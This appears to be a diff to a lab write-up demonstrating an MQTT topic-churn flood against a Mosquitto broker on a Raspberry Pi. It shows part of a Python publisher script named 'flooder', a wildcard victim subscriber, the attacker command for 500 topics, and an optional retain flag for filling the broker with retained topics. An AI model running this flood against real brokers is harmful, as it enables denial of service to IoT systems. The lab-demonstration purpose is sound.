@@ -110,7 +110,7 @@ p.add_argument("--qos", type=int, default=0)
 p.add_argument("--size", type=int, default=10, help="payload bytes")
 args = p.parse_args()
 
-client = mqtt.Client(client_id="flooder", clean_session=True, protocol=mqtt.MQTTv311)
+client = mqtt.Client(client_id="flooder", protocol=mqtt.MQTTv311)
 client.username_pw_set(args.user, args.pw)
 client.connect(args.host, 1883, 60)
 
@@ -120,12 +120,29 @@ for i in range(args.count):
     client.publish(topic, payload, qos=args.qos, retain=args.retain)
 client.disconnect()
 ```
-
-Run it:
+Steps to Demonstrate
+1️. Set Up the Victim Subscriber
+On your Raspberry Pi (or another device connected to broker), run:
 
 ```bash
-python3 attacker_topic_churn.py --host <RPI_IP> --user attacker5 --pw attackerpass --count 20000 --qos 1
+mosquitto_sub -h <RPI IP> -u topicvictim -P topicvictim -t '#' -q 0 -v
 ```
+
+# means “subscribe to everything”.
+
+-v makes Mosquitto show both topic and message.
+
+
+2️. Run the Attacker Flood
+On another terminal (attacker machine or even same Pi in new tab):
+
+```bash
+python3 attacker_topic_churn.py --host <RPI IP> --user attacker5 --pw attackerpass --count 500 --qos 0
+```
+
+--count 500 means it will publish to 500 different topics.
+
+
 
 **Optional (worse):** add `--retain` to **fill the broker** with 20k retained topics.
 
